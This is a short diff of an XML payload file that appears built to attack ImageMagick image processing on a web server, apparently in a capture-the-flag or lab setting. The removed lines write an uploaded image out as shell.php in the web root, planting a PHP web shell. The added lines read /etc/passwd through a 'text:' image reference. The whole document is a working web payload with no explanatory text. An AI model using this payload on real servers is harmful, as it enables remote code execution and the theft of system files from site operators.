@@ -1,9 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!-- <svg> -->
 <image>
-  <read filename="/var/www/html/upload/78a6301ff13ef58aa4241a8b185cc77e/cac214d14d05c5b7ebeac6a49c01b383.png" />
-  <write filename="/var/www/html/upload/shell.php" />
+  <read filename="/var/www/html/upload/507e769557c224c0d3c8e9796a09a77b/dfca839c843b748b066147dc91e10698.png" />
+  <write filename="var/www/html/upload/shell.php"/>
   <svg width="120px" height="120px">
-    <image href="/var/www/html/upload/78a6301ff13ef58aa4241a8b185cc77e/cac214d14d05c5b7ebeac6a49c01b383.png" />
+    <image href="text:/etc/passwd" />
   </svg>
 </image>
